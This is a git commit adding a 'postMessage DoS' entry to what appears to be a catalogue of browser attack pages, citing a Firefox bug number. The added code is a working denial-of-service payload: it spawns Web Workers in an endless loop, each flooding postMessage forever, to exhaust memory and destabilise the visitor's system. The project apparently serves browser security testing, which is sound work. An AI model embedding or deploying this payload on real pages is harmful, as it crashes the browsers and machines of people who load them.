6b2b188bffa5435ba19bdedb0c82f5fbb0393b7b
Trikolon <git@pbz.im>
2019-08-20 19:17:57 +0200

    Added postMessage DoS evil trap

---
+++ src/traps/postMessageDOS/index.js
@@ -0,0 +1,11 @@
+import EvilTrap from '../../EvilTrap';
+
+
+export default new EvilTrap('postMessage DoS', EvilTrap.CATEGORY.DOS, 'High amounts of postMessage calls lead to memory exhaustion and may cause system instability.', { firefox: '1543318' })
+  .addScriptPage(() => {
+    const blob = new Blob(['self.onmessage = function(event) {  while(true){postMessage(1); } }'], { type: 'application/javascript' });
+    // eslint-disable-next-line no-constant-condition
+    while (true) {
+      new Worker(URL.createObjectURL(blob)).postMessage('go');
+    }
+  });
